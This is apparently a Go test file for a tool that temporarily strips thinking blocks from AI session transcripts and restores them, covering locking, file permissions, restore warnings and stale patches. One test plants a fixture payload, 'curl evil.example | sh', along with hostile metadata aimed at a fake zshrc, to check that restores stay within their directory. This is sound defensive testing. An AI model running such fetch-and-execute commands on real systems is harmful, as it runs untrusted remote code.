package session

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/jolehuit/clother/internal/config"
)

const (
	helperEnv         = "CLOTHER_TEST_PATCH_HELPER"
	helperPatchDirEnv = "CLOTHER_TEST_PATCH_DIR"
	helperSessionEnv  = "CLOTHER_TEST_SESSION"
	helperSignalEnv   = "CLOTHER_TEST_SIGNAL_DIR"
	sleeperEnv        = "CLOTHER_TEST_SLEEP_HELPER"
)

// TestSleepHelperProcess is a process that stays alive until it is killed. It
// gives the lock tests a pid that is certainly running and certainly not ours.
func TestSleepHelperProcess(t *testing.T) {
	if os.Getenv(sleeperEnv) == "" {
		t.Skip("helper process")
	}
	time.Sleep(2 * time.Minute)
}

// TestSessionPatchHelperProcess is the second process of
// TestConcurrentInstancesNeverTruncateASession. It applies a patch, announces
// itself, waits for the parent, then restores.
func TestSessionPatchHelperProcess(t *testing.T) {
	if os.Getenv(helperEnv) == "" {
		t.Skip("helper process, driven by TestConcurrentInstancesNeverTruncateASession")
	}
	paths := config.Paths{SessionPatchDir: os.Getenv(helperPatchDirEnv)}
	sessionPath := os.Getenv(helperSessionEnv)
	signalDir := os.Getenv(helperSignalEnv)

	patch, analysis, err := PrepareTemporaryPatch(paths, sessionPath)
	if err != nil || patch == nil || !analysis.NeedsSanitization {
		t.Fatalf("helper: prepare failed patch=%v analysis=%+v err=%v", patch, analysis, err)
	}
	if err := patch.Apply(); err != nil {
		t.Fatalf("helper: apply: %v", err)
	}
	if err := os.WriteFile(filepath.Join(signalDir, "applied"), []byte("1"), 0o600); err != nil {
		t.Fatalf("helper: signal: %v", err)
	}
	if err := waitForFile(filepath.Join(signalDir, "release"), 20*time.Second); err != nil {
		t.Fatalf("helper: %v", err)
	}
	if err := patch.Restore(); err != nil {
		t.Fatalf("helper: restore: %v", err)
	}
}

func waitForFile(path string, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(path); err == nil {
			return nil
		}
		time.Sleep(10 * time.Millisecond)
	}
	return os.ErrDeadlineExceeded
}

// TestConcurrentInstancesNeverTruncateASession runs a real second process that
// owns a session patch, then calls RestoreStale from this process the way every
// clother launch does. Before the fix, RestoreStale restored the live patch:
// the backup was deleted, the transcript was rewritten under the running
// instance, and its own deferred Restore failed.
func TestConcurrentInstancesNeverTruncateASession(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "11111111-2222-3333-4444-555555555555.jsonl")
	original := strings.Join([]string{
		`{"message":{"role":"assistant","model":"glm-5.2","content":[{"type":"thinking","thinking":"secret"},{"type":"text","text":"hello"}]}}`,
		`{"message":{"role":"user","content":[{"type":"text","text":"next"}]}}`,
		"",
	}, "\n")
	if err := os.WriteFile(sessionPath, []byte(original), 0o600); err != nil {
		t.Fatal(err)
	}

	paths := config.Paths{SessionPatchDir: filepath.Join(root, "patches")}
	signalDir := filepath.Join(root, "signals")
	if err := os.MkdirAll(signalDir, 0o700); err != nil {
		t.Fatal(err)
	}

	cmd := exec.Command(os.Args[0], "-test.run=TestSessionPatchHelperProcess", "-test.v")
	cmd.Env = append(os.Environ(),
		helperEnv+"=1",
		helperPatchDirEnv+"="+paths.SessionPatchDir,
		helperSessionEnv+"="+sessionPath,
		helperSignalEnv+"="+signalDir,
	)
	var helperOutput bytes.Buffer
	cmd.Stdout = &helperOutput
	cmd.Stderr = &helperOutput
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = os.WriteFile(filepath.Join(signalDir, "release"), []byte("1"), 0o600)
		_ = cmd.Wait()
	})
	if err := waitForFile(filepath.Join(signalDir, "applied"), 30*time.Second); err != nil {
		t.Fatalf("helper never applied its patch: %v", err)
	}

	sanitized, err := os.ReadFile(sessionPath)
	if err != nil {
		t.Fatal(err)
	}
	backups, err := filepath.Glob(filepath.Join(paths.SessionPatchDir, "*.orig"))
	if err != nil || len(backups) != 1 {
		t.Fatalf("expected exactly one backup, got %v (err=%v)", backups, err)
	}

	// The live instance keeps appending turns while the second process starts.
	appended := `{"message":{"role":"assistant","model":"claude-opus-4-1","content":[{"type":"text","text":"live turn"}]}}` + "\n"
	file, err := os.OpenFile(sessionPath, os.O_APPEND|os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := file.WriteString(appended); err != nil {
		_ = file.Close()
		t.Fatal(err)
	}
	if err := file.Close(); err != nil {
		t.Fatal(err)
	}

	// Second clother instance starting up.
	if err := RestoreStale(paths); err != nil {
		t.Fatalf("RestoreStale: %v", err)
	}

	if _, err := os.Stat(backups[0]); err != nil {
		t.Fatalf("RestoreStale deleted the backup of a live instance: %v", err)
	}
	current, err := os.ReadFile(sessionPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(current) != string(sanitized)+appended {
		t.Fatalf("RestoreStale rewrote a live session file:\nwant:\n%s\ngot:\n%s", string(sanitized)+appended, string(current))
	}

	// Let the owner finish: its own restore must still work.
	if err := os.WriteFile(filepath.Join(signalDir, "release"), []byte("1"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := cmd.Wait(); err != nil {
		t.Fatalf("helper failed: %v\n%s", err, helperOutput.String())
	}

	restored, err := os.ReadFile(sessionPath)
	if err != nil {
		t.Fatal(err)
	}
	want := original + appended
	if string(restored) != want {
		t.Fatalf("the live session lost data\nwant:\n%s\ngot:\n%s", want, string(restored))
	}
	leftovers, _ := os.ReadDir(paths.SessionPatchDir)
	for _, entry := range leftovers {
		t.Fatalf("patch directory should be empty after the owner restored, found %s", entry.Name())
	}
}

// TestPrepareTemporaryPatchRefusesASessionOwnedByALiveInstance proves the
// exclusive slot: while the helper holds the lock, a second instance gets no
// patch at all instead of sharing the same backup path.
func TestPrepareTemporaryPatchRefusesASessionOwnedByALiveInstance(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "abcd-1234.jsonl")
	original := `{"message":{"role":"assistant","model":"glm-5.2","content":[{"type":"thinking","thinking":"secret"},{"type":"text","text":"hi"}]}}` + "\n"
	if err := os.WriteFile(sessionPath, []byte(original), 0o600); err != nil {
		t.Fatal(err)
	}
	paths := config.Paths{SessionPatchDir: filepath.Join(root, "patches")}
	if err := os.MkdirAll(paths.SessionPatchDir, 0o700); err != nil {
		t.Fatal(err)
	}
	// A live process owns the slot.
	sleeper := exec.Command(os.Args[0], "-test.run=TestSleepHelperProcess")
	sleeper.Env = append(os.Environ(), sleeperEnv+"=1")
	if err := sleeper.Start(); err != nil {
		t.Fatal(err)
	}
	defer func() {
		_ = sleeper.Process.Kill()
		_ = sleeper.Wait()
	}()
	lockPath := filepath.Join(paths.SessionPatchDir, "abcd-1234.lock")
	if err := os.WriteFile(lockPath, []byte(strconv.Itoa(sleeper.Process.Pid)+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	patch, analysis, err := PrepareTemporaryPatch(paths, sessionPath)
	if err != nil {
		t.Fatalf("prepare returned an error instead of yielding: %v", err)
	}
	if !analysis.NeedsSanitization {
		t.Fatal("expected the analysis to still report the thinking block")
	}
	if patch != nil {
		t.Fatalf("expected no patch while another live instance owns the session, got %+v", patch)
	}

	// Once the owner is gone the lock is taken over.
	_ = sleeper.Process.Kill()
	_, _ = sleeper.Process.Wait()
	patch, _, err = PrepareTemporaryPatch(paths, sessionPath)
	if err != nil {
		t.Fatal(err)
	}
	if patch == nil {
		t.Fatal("expected the stale lock of a dead owner to be taken over")
	}
	if !strings.Contains(filepath.Base(patch.BackupPath), strconv.Itoa(os.Getpid())) {
		t.Fatalf("backup path %q should carry the owner pid", patch.BackupPath)
	}
}

// TestRestoreKeepsTheSameInode locks in the in-place rewrite: a rename would
// swap the inode under a claude process holding the transcript open.
func TestRestoreKeepsTheSameInode(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "inode-test.jsonl")
	original := `{"message":{"role":"assistant","model":"glm-5.2","content":[{"type":"thinking","thinking":"x"},{"type":"text","text":"hi"}]}}` + "\n"
	if err := os.WriteFile(sessionPath, []byte(original), 0o600); err != nil {
		t.Fatal(err)
	}
	before, err := os.Stat(sessionPath)
	if err != nil {
		t.Fatal(err)
	}

	paths := config.Paths{SessionPatchDir: filepath.Join(root, "patches")}
	patch, _, err := PrepareTemporaryPatch(paths, sessionPath)
	if err != nil || patch == nil {
		t.Fatalf("prepare: patch=%v err=%v", patch, err)
	}
	if err := patch.Apply(); err != nil {
		t.Fatal(err)
	}
	afterApply, err := os.Stat(sessionPath)
	if err != nil {
		t.Fatal(err)
	}
	if !os.SameFile(before, afterApply) {
		t.Fatal("Apply replaced the session inode")
	}
	if err := patch.Restore(); err != nil {
		t.Fatal(err)
	}
	afterRestore, err := os.Stat(sessionPath)
	if err != nil {
		t.Fatal(err)
	}
	if !os.SameFile(before, afterRestore) {
		t.Fatal("Restore replaced the session inode")
	}
	if data, err := os.ReadFile(sessionPath); err != nil || string(data) != original {
		t.Fatalf("restored content mismatch: %q err=%v", string(data), err)
	}
}

func TestPatchDirectoryIsPrivate(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "perm.jsonl")
	original := `{"message":{"role":"assistant","model":"glm-5.2","content":[{"type":"thinking","thinking":"x"},{"type":"text","text":"hi"}]}}` + "\n"
	if err := os.WriteFile(sessionPath, []byte(original), 0o600); err != nil {
		t.Fatal(err)
	}
	paths := config.Paths{SessionPatchDir: filepath.Join(root, "patches")}
	if _, _, err := PrepareTemporaryPatch(paths, sessionPath); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(paths.SessionPatchDir)
	if err != nil {
		t.Fatal(err)
	}
	if perm := info.Mode().Perm(); perm != 0o700 {
		t.Fatalf("session patch dir mode = %v, want 0700 (it holds full transcripts)", perm)
	}
}

// TestPatchDirectoryIsNarrowedWhenItAlreadyExists is the real-world shape of
// the previous test: config.Paths pre-creates session-patches in 0755, and
// MkdirAll never touches the mode of an existing directory, so full transcript
// copies used to live in a world-readable directory.
func TestPatchDirectoryIsNarrowedWhenItAlreadyExists(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "wideopen.jsonl")
	original := `{"message":{"role":"assistant","model":"glm-5.2","content":[{"type":"thinking","thinking":"x"},{"type":"text","text":"hi"}]}}` + "\n"
	if err := os.WriteFile(sessionPath, []byte(original), 0o600); err != nil {
		t.Fatal(err)
	}
	paths := config.Paths{SessionPatchDir: filepath.Join(root, "patches")}
	if err := os.MkdirAll(paths.SessionPatchDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(paths.SessionPatchDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if _, _, err := PrepareTemporaryPatch(paths, sessionPath); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(paths.SessionPatchDir)
	if err != nil {
		t.Fatal(err)
	}
	if perm := info.Mode().Perm(); perm != 0o700 {
		t.Fatalf("pre-existing patch dir mode = %v, want 0700 (it holds full transcripts)", perm)
	}
}

// TestRestoreOrWarnReportsAFailedRestore locks the other half of C2: the
// deferred restore used to drop its error, leaving the user with a transcript
// silently stripped of its thinking blocks and no idea where the backup is.
func TestRestoreOrWarnReportsAFailedRestore(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "noisy.jsonl")
	original := `{"message":{"role":"assistant","model":"glm-5.2","content":[{"type":"thinking","thinking":"x"},{"type":"text","text":"hi"}]}}` + "\n"
	if err := os.WriteFile(sessionPath, []byte(original), 0o600); err != nil {
		t.Fatal(err)
	}
	paths := config.Paths{SessionPatchDir: filepath.Join(root, "patches")}
	patch, _, err := PrepareTemporaryPatch(paths, sessionPath)
	if err != nil || patch == nil {
		t.Fatalf("prepare: patch=%v err=%v", patch, err)
	}
	if err := patch.Apply(); err != nil {
		t.Fatal(err)
	}
	// The transcript diverged: the merge refuses, exactly the case that used to
	// be swallowed by `defer patch.Restore()`.
	if err := os.WriteFile(sessionPath, []byte(`{"type":"summary"}`+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	warnings := captureWarnings(t)
	patch.RestoreOrWarn()
	joined := strings.Join(*warnings, "\n")
	if !strings.Contains(joined, patch.BackupPath) || !strings.Contains(joined, patch.OriginalPath) {
		t.Fatalf("a failed deferred restore must name the transcript and its backup, got: %q", joined)
	}
	if _, err := os.Stat(patch.BackupPath); err != nil {
		t.Fatalf("the backup must survive a failed restore: %v", err)
	}
}

// TestRestoreStaleRejectsPathsOutsideItsDirectory covers the hostile metadata
// case: RestoreStale used to write to any path a .json in the patch directory
// named.
func TestRestoreStaleRejectsPathsOutsideItsDirectory(t *testing.T) {
	root := t.TempDir()
	patchDir := filepath.Join(root, "patches")
	if err := os.MkdirAll(patchDir, 0o700); err != nil {
		t.Fatal(err)
	}
	victim := filepath.Join(root, "zshrc")
	if err := os.WriteFile(victim, []byte("# untouched\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	payload := filepath.Join(root, "payload")
	if err := os.WriteFile(payload, []byte("curl evil.example | sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	// A .san whose content matches the victim makes the merge succeed, so the
	// only thing standing between this metadata file and an arbitrary write is
	// the confinement check.
	sanitizedPath := filepath.Join(patchDir, "hostile.san")
	if err := os.WriteFile(sanitizedPath, []byte("# untouched\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	metaPath := filepath.Join(patchDir, "hostile.json")
	meta, err := json.MarshalIndent(Patch{
		OriginalPath:  victim,
		BackupPath:    payload,
		SanitizedPath: sanitizedPath,
		MetadataPath:  metaPath,
		AppliedUnix:   time.Now().Unix(),
	}, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(metaPath, meta, 0o600); err != nil {
		t.Fatal(err)
	}

	warnings := captureWarnings(t)
	if err := RestoreStale(config.Paths{SessionPatchDir: patchDir}); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(victim)
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != "# untouched\n" {
		t.Fatalf("RestoreStale wrote outside the session tree: %q", string(data))
	}
	if _, err := os.Stat(metaPath); !os.IsNotExist(err) {
		t.Fatalf("hostile metadata should be dropped, stat err=%v", err)
	}
	if len(*warnings) == 0 {
		t.Fatal("expected a warning about the rejected patch")
	}
}

// TestRestoreStaleAbandonsAnUnrestorablePatch covers the forever-retry loop: a
// patch whose prefix no longer matches used to be retried, silently, at every
// single launch.
func TestRestoreStaleAbandonsAnUnrestorablePatch(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "diverged.jsonl")
	original := strings.Join([]string{
		`{"message":{"role":"assistant","model":"glm-5.2","content":[{"type":"thinking","thinking":"secret"},{"type":"text","text":"hello"}]}}`,
		"",
	}, "\n")
	if err := os.WriteFile(sessionPath, []byte(original), 0o600); err != nil {
		t.Fatal(err)
	}
	paths := config.Paths{SessionPatchDir: filepath.Join(root, "patches")}
	patch, _, err := PrepareTemporaryPatch(paths, sessionPath)
	if err != nil || patch == nil {
		t.Fatalf("prepare: patch=%v err=%v", patch, err)
	}
	if err := patch.Apply(); err != nil {
		t.Fatal(err)
	}
	// Something rewrote the head of the transcript: the prefix merge can never
	// succeed again.
	if err := os.WriteFile(sessionPath, []byte(`{"type":"summary","summary":"compacted"}`+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	// Age the patch past the abandon threshold.
	patch.AppliedUnix = time.Now().Add(-48 * time.Hour).Unix()
	meta, err := json.MarshalIndent(patch, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(patch.MetadataPath, meta, 0o600); err != nil {
		t.Fatal(err)
	}

	warnings := captureWarnings(t)
	if err := RestoreStale(paths); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(patch.MetadataPath); !os.IsNotExist(err) {
		t.Fatalf("abandoned patch metadata should be removed, stat err=%v", err)
	}
	if _, err := os.Stat(patch.BackupPath); err != nil {
		t.Fatalf("the backup must be kept for the user to recover: %v", err)
	}
	if _, err := os.Stat(patch.LockPath); !os.IsNotExist(err) {
		t.Fatalf("abandoning a patch must release its lock, stat err=%v", err)
	}
	joined := strings.Join(*warnings, "\n")
	if !strings.Contains(joined, patch.BackupPath) {
		t.Fatalf("the user must be told where the backup is, got: %s", joined)
	}
}

func TestRestoreStalePurgesAVeryOldBackup(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "ancient.jsonl")
	original := `{"message":{"role":"assistant","model":"glm-5.2","content":[{"type":"thinking","thinking":"x"},{"type":"text","text":"hi"}]}}` + "\n"
	if err := os.WriteFile(sessionPath, []byte(original), 0o600); err != nil {
		t.Fatal(err)
	}
	paths := config.Paths{SessionPatchDir: filepath.Join(root, "patches")}
	patch, _, err := PrepareTemporaryPatch(paths, sessionPath)
	if err != nil || patch == nil {
		t.Fatalf("prepare: patch=%v err=%v", patch, err)
	}
	if err := patch.Apply(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(sessionPath, []byte("{}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	patch.AppliedUnix = time.Now().Add(-8 * 24 * time.Hour).Unix()
	meta, err := json.MarshalIndent(patch, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(patch.MetadataPath, meta, 0o600); err != nil {
		t.Fatal(err)
	}

	warnings := captureWarnings(t)
	if err := RestoreStale(paths); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(patch.BackupPath); !os.IsNotExist(err) {
		t.Fatalf("a week-old unrestorable transcript copy should be purged, stat err=%v", err)
	}
	if len(*warnings) == 0 {
		t.Fatal("purging a backup must warn the user")
	}
}

// TestAnalyzeIgnoresAnOversizedRecord: a single huge line used to abort the
// whole launch with "bufio.Scanner: token too long".
func TestAnalyzeIgnoresAnOversizedRecord(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "huge.jsonl")
	file, err := os.Create(sessionPath)
	if err != nil {
		t.Fatal(err)
	}
	chunk := strings.Repeat("a", 1024*1024)
	if _, err := file.WriteString(`{"message":{"role":"user","content":[{"type":"text","text":"`); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 17; i++ {
		if _, err := file.WriteString(chunk); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := file.WriteString(`"}]}}` + "\n"); err != nil {
		t.Fatal(err)
	}
	if err := file.Close(); err != nil {
		t.Fatal(err)
	}

	analysis, err := Analyze(sessionPath)
	if err != nil {
		t.Fatalf("an oversized record must not make the session unopenable: %v", err)
	}
	if analysis.NeedsSanitization {
		t.Fatalf("unexpected analysis: %+v", analysis)
	}
}

func captureWarnings(t *testing.T) *[]string {
	t.Helper()
	previous := patchWarn
	var collected []string
	patchWarn = func(format string, args ...any) {
		collected = append(collected, fmt.Sprintf(format, args...))
	}
	t.Cleanup(func() { patchWarn = previous })
	return &collected
}

// A pid is not evidence of a live owner: the operating system recycles pids, so
// a lock left behind by a crash whose number has since been handed to an
// unrelated process looked alive forever. PrepareTemporaryPatch then returned
// (nil, analysis, nil) and every later launch ran claude on an unsanitized
// transcript without a word. RestoreStale already combined liveness with an
// age; the lock now does the same.
func TestSessionLockIgnoresAnAbandonedLockOnARecycledPid(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee.jsonl")
	transcript := `{"message":{"role":"assistant","model":"glm-5.2","content":[{"type":"thinking","thinking":"x"},{"type":"text","text":"hi"}]}}` + "\n"
	if err := os.WriteFile(sessionPath, []byte(transcript), 0o600); err != nil {
		t.Fatal(err)
	}
	paths := config.Paths{SessionPatchDir: filepath.Join(root, "patches")}
	if err := os.MkdirAll(paths.SessionPatchDir, 0o700); err != nil {
		t.Fatal(err)
	}

	// pid 1 is always alive and is certainly not a clother.
	lockPath := filepath.Join(paths.SessionPatchDir, "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee.lock")
	stale := time.Now().Add(-patchAbandonAfter - time.Hour).Unix()
	if err := os.WriteFile(lockPath, []byte(fmt.Sprintf("pid=1\nunix=%d\n", stale)), 0o600); err != nil {
		t.Fatal(err)
	}

	patch, analysis, err := PrepareTemporaryPatch(paths, sessionPath)
	if err != nil {
		t.Fatal(err)
	}
	if !analysis.NeedsSanitization {
		t.Fatal("the fixture transcript should need sanitizing")
	}
	if patch == nil {
		t.Fatal("an abandoned lock on a recycled pid still blocks sanitization")
	}
}

// A lock taken moments ago by a live process is still respected — and no longer
// in silence.
func TestSessionLockRespectsALiveOwnerAndSaysSo(t *testing.T) {
	root := t.TempDir()
	sessionPath := filepath.Join(root, "aaaaaaaa-bbbb-cccc-dddd-ffffffffffff.jsonl")
	transcript := `{"message":{"role":"assistant","model":"glm-5.2","content":[{"type":"thinking","thinking":"x"},{"type":"text","text":"hi"}]}}` + "\n"
	if err := os.WriteFile(sessionPath, []byte(transcript), 0o600); err != nil {
		t.Fatal(err)
	}
	paths := config.Paths{SessionPatchDir: filepath.Join(root, "patches")}
	if err := os.MkdirAll(paths.SessionPatchDir, 0o700); err != nil {
		t.Fatal(err)
	}
	lockPath := filepath.Join(paths.SessionPatchDir, "aaaaaaaa-bbbb-cccc-dddd-ffffffffffff.lock")
	if err := os.WriteFile(lockPath, []byte(fmt.Sprintf("pid=1\nunix=%d\n", time.Now().Unix())), 0o600); err != nil {
		t.Fatal(err)
	}

	var warnings []string
	previous := patchWarn
	patchWarn = func(format string, args ...any) { warnings = append(warnings, fmt.Sprintf(format, args...)) }
	t.Cleanup(func() { patchWarn = previous })

	patch, _, err := PrepareTemporaryPatch(paths, sessionPath)
	if err != nil {
		t.Fatal(err)
	}
	if patch != nil {
		t.Fatal("a live owner must keep the slot")
	}
	if len(warnings) == 0 {
		t.Fatal("skipping the sanitization was silent")
	}
}

// A lock written by a version that recorded no timestamp is still understood.
func TestReadLockOwnerAcceptsTheLegacyBarePidFormat(t *testing.T) {
	lockPath := filepath.Join(t.TempDir(), "legacy.lock")
	if err := os.WriteFile(lockPath, []byte("4242\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	pid, taken, ok := readLockOwner(lockPath)
	if !ok || pid != 4242 {
		t.Fatalf("readLockOwner = %d, %v, %v", pid, taken, ok)
	}
	if !taken.IsZero() {
		t.Fatalf("a legacy lock has no timestamp, got %v", taken)
	}
}
